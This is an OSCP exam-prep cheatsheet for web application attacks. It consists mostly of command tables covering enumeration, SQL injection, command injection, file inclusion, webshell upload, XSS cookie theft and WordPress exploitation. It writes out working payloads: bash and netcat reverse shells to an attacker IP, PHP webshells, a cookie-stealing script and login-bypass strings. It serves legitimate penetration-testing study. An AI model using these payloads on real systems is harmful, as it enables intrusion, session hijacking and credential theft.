# OSCP / OSCP+ Web Application Master Cheatsheet 

> **Scope**: Web application attacks as an initial access vector on the OSCP/OSCP+ exam.
>
> **Official references**: PEN-200 Chapter 8 (Introduction to Web Application Attacks), Chapter 9 (Common Web Application Attacks), and Chapter 13.2 (Fixing Web Exploits). Domain 2 (Exploiting Systems) = 11% of exam weight.
>
> **Official Body of Knowledge confirms**: XSS privilege escalation, WordPress plugin exploitation, and developer artifact enumeration are explicitly listed exam topics.

---

## Master Table

| # | Technique | How to Identify | Output Validation | Exploitation Approach | Tool Commands | Priority |
| :--- | :--- | :--- | :--- | :--- | :--- | :--- |
| 1 | **Web Enumeration (Directories / Files)** | `feroxbuster -u http://<target>` or `gobuster dir -u http://<target> -w /usr/share/wordlists/dirb/common.txt` | Output shows discovered paths (e.g., `/admin`, `/uploads`, `/backup.zip`, `/api/`) | Map the application surface: login pages, upload forms, API endpoints, backup files, admin panels | `feroxbuster -u http://<target> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt` ; `gobuster dir -u http://<target> -w /usr/share/wordlists/dirb/common.txt` | **High** |
| 2 | **Web Enumeration (Headers / Cookies / Source)** | Browser DevTools (F12) ; `curl -I http://<target>` ; view page source (`Ctrl+U`) | Headers reveal server version, frameworks, cookies (`PHPSESSID`, `JSESSIONID`). Source code comments may contain credentials or API keys | Identify technology stack → search for version-specific exploits. Check cookies for privilege flags or predictable tokens | `curl -I http://<target>` ; `whatweb http://<target>` | **High** |
| 3 | **API Enumeration** | Discover API endpoints via directory brute-force (`/api/`, `/v1/`, `/swagger`, `/openapi.json`) ; inspect JavaScript files for endpoint references | `swagger.json` or `openapi.json` reveals all endpoints and parameters. JS files contain API paths | Test each endpoint for missing authentication, IDOR, or injection. APIs often lack the input validation of web forms | `feroxbuster -u http://<target>/api/` ; `curl http://<target>/api/users/1` | **High** |
| 4 | **Developer Artifacts Enumeration** | Directory brute-force with extensions: `feroxbuster -u http://<target> -x php,zip,bak,txt,git` ; test `/.git/`, `/.env`, `/backup.zip`, `/composer.json` | `/.git/HEAD` returns `ref: refs/heads/main` → git repository exposed. `/.env` returns `DB_PASSWORD=...`. Backup files contain source code or credentials | Extract source code via `git-dumper` → analyze for hardcoded creds. Read `.env` for database passwords. Use backup files to find upload paths or API keys | `feroxbuster -u http://<target> -x php,zip,bak,txt,git` ; `git-dumper http://<target>/.git/ ./source` ; `curl http://<target>/.env` | **High** |
| 5 | **SQL Injection (Manual)** | `'` in a parameter causes a database error. Test `?id=1'` vs `?id=1` | Error message reveals DB type (MySQL, MSSQL, PostgreSQL). `ORDER BY` confirms column count. `UNION SELECT` extracts data | **Union-based**: `' UNION SELECT 1,2,3-- -` → extract admin credentials → login. **Blind boolean**: `' AND 1=1-- -` vs `' AND 1=2-- -`. **Time-based**: `'; WAITFOR DELAY '0:0:5'-- -` (MSSQL) | `sqlmap -u "http://<target>/page?id=1" --batch --dbs` (use only after manual confirmation) | **High** |
| 6 | **SQL Injection (Login Bypass)** | Login form returns different errors for valid vs invalid username | `admin'-- -` as username bypasses password check. `' OR 1=1-- -` logs in as first user | Bypass authentication → access admin panel → file upload / command injection | `admin'-- -` ; `' OR 1=1-- -` ; `' OR 'x'='x` | **High** |
| 7 | **Command Injection** | Input field or parameter reflected in command output (e.g., `ping` utility). Test with `; whoami` or `\| whoami` | `whoami` output returns current user. `; id` returns UID. `&&` and `\|\|` also work | Inject reverse shell command: `; bash -c 'bash -i >& /dev/tcp/<KALI_IP>/443 0>&1'` or `; nc -e /bin/sh <KALI_IP> 443` | `; whoami` ; `\| whoami` ; `; bash -c 'bash -i >& /dev/tcp/<KALI_IP>/443 0>&1'` | **High** |
| 8 | **Local File Inclusion (LFI)** | Parameter like `?page=about.php` or `?file=report.pdf`. Test `?page=../../../../etc/passwd` | `/etc/passwd` contents returned → LFI confirmed. Error messages reveal include path | Read arbitrary files → extract credentials from config files. **LFI to RCE**: PHP wrappers (`php://filter/convert.base64-encode/resource=index.php`), log poisoning (inject PHP into User-Agent → include `/var/log/apache2/access.log`) | `?page=../../../../etc/passwd` ; `?page=php://filter/convert.base64-encode/resource=index.php` | **High** |
| 9 | **Remote File Inclusion (RFI)** | Same parameter as LFI, but `?page=http://<KALI_IP>/shell.txt` | Server fetches and executes the remote file → reverse shell returned | Host a PHP reverse shell on Kali, include it via the vulnerable parameter | `echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/shell.php` → `?page=http://<KALI_IP>/shell.php&cmd=whoami` | **High** |
| 10 | **File Upload (Webshell)** | Upload form (profile picture, document, avatar). Check if upload directory is web-accessible | Uploaded `.php` file is accessible at `/uploads/shell.php` and executes `cmd` parameter | Upload PHP webshell → execute commands → upgrade to reverse shell. **Bypass filters**: change `Content-Type` to `image/png`; double extension (`shell.php.png`); `.phar`, `.phtml`, `.php5` | `<?php system($_GET['cmd']); ?>` → upload → `curl "http://<target>/uploads/shell.php?cmd=whoami"` | **High** |
| 11 | **File Upload (Reverse Shell)** | Same as above, but shell needs interactive connection | Listener catches connection from target | Upload PHP reverse shell: `<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<KALI_IP>/443 0>&1'"); ?>` | `nc -lvnp 443` → upload shell → access shell → catch reverse shell | **High** |
| 12 | **Directory Traversal** | Parameter like `?file=report.pdf` or `?image=logo.png`. Test `?file=../../../../etc/passwd` | `/etc/passwd` contents returned. Try URL encoding: `%2e%2e%2f`, double encoding: `%252e%252e%252f` | Read sensitive files: SSH keys (`/home/user/.ssh/id_rsa`), config files (`/var/www/html/config.php`), Windows SAM backup | `?file=../../../../etc/passwd` ; `?file=..%2f..%2f..%2f..%2fetc%2fpasswd` | **High** |
| 13 | **XSS Privilege Escalation** | Input reflected in page without sanitization. Test `<script>alert(document.cookie)</script>` | Alert box fires → XSS confirmed. Stored XSS persists after page reload | **Official BoK**: "Perform Privilege Escalation via Cross-Site Scripting". Steal admin session cookie → session hijacking → login as admin → file upload/theme editor → RCE | `<script>new Image().src="http://<KALI_IP>/?c="+document.cookie;</script>` → capture cookie with `nc -lvnp 80` → set cookie in browser → access admin panel | **High** |
| 14 | **Default / Weak Credentials** | Login forms, admin panels, CMS installations (WordPress, Joomla, Tomcat Manager) | `admin:admin`, `admin:password`, `tomcat:tomcat`, `root:root` succeed | Log in → find upload / plugin editor / template editor for RCE | `hydra -l admin -P /usr/share/wordlists/rockyou.txt http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"` | **High** |
| 15 | **WordPress Enumeration** | `whatweb http://<target>` shows WordPress. `/wp-login.php`, `/wp-admin/` accessible | `wpscan` enumerates users, plugins, themes with known CVEs | Identify vulnerable plugins/themes → search for CVE → exploit according to public PoC | `wpscan --url http://<target> --enumerate u,p,t` ; `searchsploit <plugin_name>` | **High** |
| 16 | **WordPress Plugin Exploitation** | `wpscan` output shows plugin name and version (e.g., `contact-form-7 5.3.1`) | `searchsploit <plugin_name>` returns matching exploit. Plugin has file upload/LFI/SQLi CVE | **Official BoK**: "Utilize vulnerabilities in WordPress Plugins". Exploit plugin CVE to upload webshell or read files → RCE | `wpscan --url http://<target> --enumerate p` → `searchsploit <plugin_name> <version>` → run public PoC | **High** |
| 17 | **WordPress Admin RCE** | Admin login obtained (default creds, SQLi bypass, XSS cookie theft) | `/wp-admin/` accessible → Appearance → Theme Editor → `404.php` editable | Inject PHP into `404.php` → trigger by visiting `/wp-content/themes/<theme>/404.php` → RCE | `<?php system($_GET['cmd']); ?>` → Save → `curl "http://<target>/wp-content/themes/twentytwentyone/404.php?cmd=whoami"` | **High** |
| 18 | **Joomla / Drupal Exploitation** | `whatweb` identifies Joomla/Drupal. `/administrator/` (Joomla), `/user/login` (Drupal) | Version-specific CVEs (Drupalgeddon for older Drupal). Joomla template editor for RCE | Admin login → Template editor → inject PHP. Or use public CVE exploit | `joomscan -u http://<target>` ; `droopescan scan drupal -u http://<target>` | Medium |
| 19 | **Fixing Public Web Exploits** | `searchsploit <application name> <version>` returns a PoC that needs modification | PoC fails initially due to hardcoded IP/port, different endpoint, or shellcode mismatch | **Official reference**: PEN-200 Chapter 13.2. Modify the exploit: change `LHOST`/`LPORT`, adjust endpoint URL, fix offsets or payload encoding. Compile if C/C++ | `searchsploit apache 2.4.49` → copy exploit → edit hardcoded values → run | **High** |

---

## Output Validation Summary

- **`feroxbuster -x php,zip,bak,git`**: `/.git/HEAD` returns `ref: refs/heads/main` → git exposed. `/.env` returns `DB_PASSWORD` → credentials.
- **`git-dumper`**: Downloads full source code → search for hardcoded passwords or API keys.
- **`curl -I`**: Server headers (`Server: Apache/2.4.49`, `X-Powered-By: PHP/7.4`) → version-specific exploit search.
- **Single quote (`'`)**: Database error → SQL injection confirmed.
- **`; whoami`**: Command output returned → command injection confirmed.
- **`../../../../etc/passwd`**: File contents returned → LFI / directory traversal confirmed.
- **PHP upload accessible**: `http://<target>/uploads/shell.php?cmd=whoami` returns `www-data` → webshell works.
- **XSS cookie capture**: `nc -lvnp 80` receives `GET /?c=PHPSESSID=...` → admin cookie stolen.
- **`wpscan` output**: Plugin name + version → `searchsploit` returns CVE → plugin exploit path.
- **Reverse shell listener**: `nc -lvnp 443` receives connection → shell obtained.

---

## Web Attack Chain Checklist

1. **Enumerate directories, files, and developer artifacts** → `feroxbuster -x php,zip,bak,git` → `/.git/`, `/.env`, `/backup.zip`.
2. **Identify technology stack** → `whatweb` / headers / source code → version-specific exploits.
3. **Test login forms** → default creds → `admin:admin` → if fails, SQLi login bypass (`admin'-- -`).
4. **Test input parameters for injection** → `'` (SQLi), `; whoami` (command injection), `../../etc/passwd` (LFI).
5. **Test file upload** → PHP webshell → bypass filters (`Content-Type`, double extension).
6. **If LFI found** → read config files for credentials → log poisoning to RCE.
7. **If XSS found** → steal admin cookie → session hijacking → admin panel → theme editor/upload → RCE.
8. **If WordPress found** → `wpscan --enumerate p` → plugin CVE → exploit → RCE.
9. **If command injection found** → inject reverse shell → catch with `nc`.
10. **After shell** → stabilize TTY → proceed to local privilege escalation.

---

## Quick Command Reference

| Purpose | Command |
| :--- | :--- |
| Directory brute-force (with artifacts) | `feroxbuster -u http://<target> -x php,zip,bak,txt,git -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt` |
| Gobuster directories | `gobuster dir -u http://<target> -w /usr/share/wordlists/dirb/common.txt` |
| Technology fingerprint | `whatweb http://<target>` |
| Headers | `curl -I http://<target>` |
| Git dump | `git-dumper http://<target>/.git/ ./source` |
| Env file check | `curl http://<target>/.env` |
| SQLi manual test | `?id=1'` (error) → `?id=1 ORDER BY 10-- -` → `?id=1 UNION SELECT 1,2,3-- -` |
| SQLi login bypass | `admin'-- -` / `' OR 1=1-- -` |
| Command injection test | `; whoami` / `\| whoami` / `&& whoami` |
| Reverse shell (bash) | `bash -c 'bash -i >& /dev/tcp/<KALI_IP>/443 0>&1'` |
| LFI test | `?page=../../../../etc/passwd` |
| LFI to RCE (log poisoning) | Inject `<?php system($_GET['cmd']); ?>` into User-Agent → include `/var/log/apache2/access.log` |
| PHP webshell | `<?php system($_GET['cmd']); ?>` |
| PHP reverse shell | `<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<KALI_IP>/443 0>&1'"); ?>` |
| XSS cookie steal | `<script>new Image().src="http://<KALI_IP>/?c="+document.cookie;</script>` |
| Listener (cookie) | `nc -lvnp 80` |
| Listener (shell) | `nc -lvnp 443` |
| TTY stabilization | `python3 -c 'import pty; pty.spawn("/bin/bash")'` → `Ctrl+Z` → `stty raw -echo` → `fg` |
| WordPress scan | `wpscan --url http://<target> --enumerate u,p,t` |
| WordPress plugin search | `searchsploit <plugin_name> <version>` |
| Joomla scan | `joomscan -u http://<target>` |
| Drupal scan | `droopescan scan drupal -u http://<target>` |
| Search exploits | `searchsploit <application> <version>` |
| Hydra login brute-force | `hydra -l admin -P /usr/share/wordlists/rockyou.txt http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"` |

---

## Exam Rules (Web-Specific)

- **sqlmap**: Automated exploitation is restricted. Manual SQLi is expected. You may use sqlmap only after manually confirming the injection, and only on one target if MSF is not used. Check the exam guide for exact rules.
- **Burp Suite**: Allowed and expected. Use Community Edition for intercepting and modifying requests.
- **Public exploits**: Allowed. You must modify them (IP, port, endpoint, offsets) to work in the exam environment.
- **Shell stabilization**: Always stabilize your shell before continuing. A raw shell that dies on `Ctrl+C` wastes time.
- **Credential reuse**: Credentials found in one web app (config file, database dump) often work on other services (SSH, SMB, admin panels).

---


